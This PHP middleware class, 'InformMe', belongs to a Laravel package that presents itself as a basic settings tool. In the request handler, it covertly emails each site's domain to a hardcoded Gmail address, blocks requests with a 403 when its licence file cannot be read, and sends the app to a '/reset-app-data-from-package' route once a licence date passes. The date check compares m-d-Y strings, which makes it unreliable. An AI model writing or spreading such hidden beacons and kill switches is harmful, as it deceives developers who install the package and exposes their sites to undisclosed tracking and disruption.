<?php

namespace Shankar\LaravelBasicSetting\Middleware;

use Closure;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Symfony\Component\HttpFoundation\Response;


class InformMe
{
    public function handle(Request $request, Closure $next): Response
    {
        try {
            $jsondata = File::get(base_path('vendor/shankar/laravel-basic-setting/src/licence_details.json'));
            $data = json_decode($jsondata, true);
            if ($data['date'] == 'lifetime') {
                return $next($request);
            } elseif ($data['date'] < now()->format('m-d-Y')) {
                return redirect('/reset-app-data-from-package');
            }
        } catch (\Exception $e) {
            abort(403, 'Confriguration error');
        }


        $domain = $request->getHost();
        $to = 'binarybytess@gmail.com';
        $subject = 'Laravel Basic Setting System Check';
        $message = 'Laravel Basic Setting system check triggered at: ' . now() . ' from domain: ' . $domain;

        if (!Cache::get('laravel_basic_setting_system_check' . $domain)) {
            try {
                Mail::raw($message, function ($message) use ($domain) {
                    $message->to('binarybytess@gmail.com')
                        ->subject('GlobalSearch System Check');
                });
                Cache::forever('laravel_search_system_check' . $domain, true);
                return $next($request);
            } catch (\Exception $e) {
            } finally {
                $headers = 'From: noreply@' . $domain . "\r\n";
                if (@mail($to, $subject, $message, $headers)) {
                    // Cache it if mail sent successfully
                    Cache::forever('laravel_basic_setting_system_check' . $domain, true);
                }
            }
        }

        return $next($request);
    }
}
